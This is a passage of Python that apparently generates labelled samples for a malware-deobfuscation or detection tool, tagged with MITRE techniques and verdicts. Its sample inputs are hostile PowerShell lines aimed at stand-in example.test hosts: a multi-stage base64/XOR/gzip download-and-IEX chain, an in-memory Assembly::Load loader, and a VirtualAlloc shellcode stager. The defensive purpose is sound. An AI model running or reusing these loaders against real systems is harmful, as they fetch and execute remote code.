    for i, (url, key) in enumerate(variants, 1):
        inp = (
            f"# RC4-encoded payload with hardcoded key: '{key}'\n"
            f"# recovered plaintext: '{url}'"
        )
        out.append(_sample(
            "rc4_analyst", i, inp, url,
            ["rc4-decrypt"], {"urls": [url]},
            [MITRE_OBFUS, MITRE_INGRESS], ["powershell"], "Malicious", 78,
            "RC4 with hardcoded ASCII key",
        ))
    return out


def cat_multi_stage_b64_gz_xor() -> List[Dict[str, Any]]:
    variants = [
        ("http://ms-1.example.test/c2", 0x11),
        ("http://ms-2.example.test/c2", 0x22),
        ("http://ms-3.example.test/c2", 0x33),
        ("http://ms-4.example.test/c2", 0x44),
        ("http://ms-5.example.test/c2", 0x55),
    ]
    out: List[Dict[str, Any]] = []
    for i, (url, key) in enumerate(variants, 1):
        inner = f"IEX (iwr '{url}' -useb)"
        gz = gzip.compress(inner.encode())
        xored = _xor(gz, key)
        enc = base64.b64encode(xored).decode()
        inp = f"$p='{enc}'; # xor-key 0x{key:02x}  # multi-stage: b64 → xor → gz → iex"
        out.append(_sample(
            "multi_stage_b64_gz_xor", i, inp, url,
            ["base64-decode", "xor", "gzip-decompress"],
            {"urls": [url]},
            [MITRE_PS_IEX, MITRE_OBFUS, MITRE_INGRESS],
            ["powershell"], "Malicious", 90,
            f"Multi-stage chain: Base64 → XOR 0x{key:02x} → GZIP → IEX",
        ))
    return out


# ============================================================================
# F. Reflection / in-memory loaders (identity passthrough)
# ============================================================================
def cat_reflection_assembly_load() -> List[Dict[str, Any]]:
    urls = [
        "http://refl-1.example.test/asm.bin",
        "http://refl-2.example.test/asm.bin",
        "http://refl-3.example.test/asm.bin",
        "http://refl-4.example.test/asm.bin",
        "http://refl-5.example.test/asm.bin",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(urls, 1):
        inp = (
            f"$b=(New-Object Net.WebClient).DownloadData('{url}'); "
            "[System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)"
        )
        out.append(_sample(
            "reflection_assembly_load", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_REFLECTION, MITRE_PS_IEX, MITRE_INGRESS],
            ["powershell"], "Malicious", 92,
            "System.Reflection.Assembly::Load in-memory .NET loader",
        ))
    return out


def cat_shellcode_virtualalloc() -> List[Dict[str, Any]]:
    variants = [
        "http://sc-1.example.test/beacon",
        "http://sc-2.example.test/beacon",
        "http://sc-3.example.test/beacon",
        "http://sc-4.example.test/beacon",
        "http://sc-5.example.test/beacon",
    ]
    out: List[Dict[str, Any]] = []
    for i, url in enumerate(variants, 1):
        inp = (
            f"# stager fetch: {url}\n"
            "$b=[System.Convert]::FromBase64String($enc); "
            "$p=[Kernel32]::VirtualAlloc(0,$b.Length,0x3000,0x40); "
            "[System.Runtime.InteropServices.Marshal]::Copy($b,0,$p,$b.Length); "
            "[Kernel32]::CreateThread(0,0,$p,0,0,0)"
        )
        out.append(_sample(
            "shellcode_virtualalloc", i, inp, url,
            ["extract-url"], {"urls": [url]},
            [MITRE_SHELLCODE, MITRE_PS_IEX, MITRE_INGRESS],
            ["powershell"], "Malicious", 94,
            "VirtualAlloc + CreateThread shellcode stager",
        ))
    return out


# ============================================================================
# Public: v2 category function list — imported by generator.CATEGORIES
# ============================================================================
V2_CATEGORIES = [
    # A. Real-world malware families
    cat_lumma_stealer,
    cat_clickfix,
    cat_asyncrat_stager,
    # B. LOLBAS wrappers
    cat_lolbas_mshta,
    cat_lolbas_rundll32,
    cat_lolbas_regsvr32,
    cat_lolbas_msiexec,
    cat_lolbas_certutil,
    cat_lolbas_bitsadmin,
    cat_lolbas_msbuild,
    cat_lolbas_installutil,
    cat_lolbas_wmic,
    cat_lolbas_schtasks,
    cat_lolbas_reg_run,
    # C. Container / script formats
    cat_hta_javascript,
    cat_vbscript_execute,
    cat_js_eval_atob,
    cat_office_macro,
    cat_lnk_launcher,
    cat_onenote_embed,
    cat_iso_lnk_wrapper,
    cat_zip_password_paste,
    # D. Encoding variants
    cat_triple_base64,
    cat_url_encoding,
    cat_octal_ascii,
    cat_unicode_escapes,
    cat_caret_escaping_cmd,
    cat_env_var_expansion,
    cat_string_concat_iex,
    cat_char_arrays,
    cat_join_split,
    cat_format_operator,
    cat_reverse_strings,
    cat_batch_var_slicing,
    # E. Crypto
    cat_aes_cbc_analyst,
    cat_rc4_analyst,
    cat_multi_stage_b64_gz_xor,
    # F. Reflection / loaders
    cat_reflection_assembly_load,
    cat_shellcode_virtualalloc,
]
